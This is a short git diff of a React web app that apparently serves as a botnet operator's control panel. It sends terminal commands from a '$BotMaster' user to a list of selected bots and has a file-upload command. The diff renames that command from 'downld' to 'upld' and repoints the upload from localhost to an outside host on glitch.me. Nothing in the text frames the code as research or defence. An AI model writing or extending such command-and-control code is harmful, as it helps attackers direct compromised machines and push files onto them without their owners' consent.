@@ -4,8 +4,10 @@ import Header from "./components/Header";
 import Online from "./components/online";
 import { io } from "socket.io-client";
 
-const socket = io.connect("http://localhost:4000");
-
+const socket = io("http://localhost:4000/", {
+  transports: ["websocket"],
+  withCredentials: true,
+});
 function App() {
   const [terminalResponses, setTerminalResponses] = useState([""]);
   const [clearScreen, setClearScreen] = useState(false);
@@ -57,7 +59,7 @@ function App() {
       setClearScreen(true);
     } else if (value.trim().toLowerCase() === "exit") {
       window.location.reload();
-    } else if (value.trim().toLowerCase() === "downld") {
+    } else if (value.trim().toLowerCase() === "upld") {
       fileInputRef.current.click();
     } else {
       const data = { cmd: value, user: "$BotMaster", target: selectedBotList };
@@ -73,7 +75,7 @@ function App() {
     formData.append('file', file);
 
     try {
-      const response = await fetch('http://localhost:4000/upload', {
+      const response = await fetch('https://raveneye.glitch.me/upload', {
         method: 'POST',
         body: formData,
       });
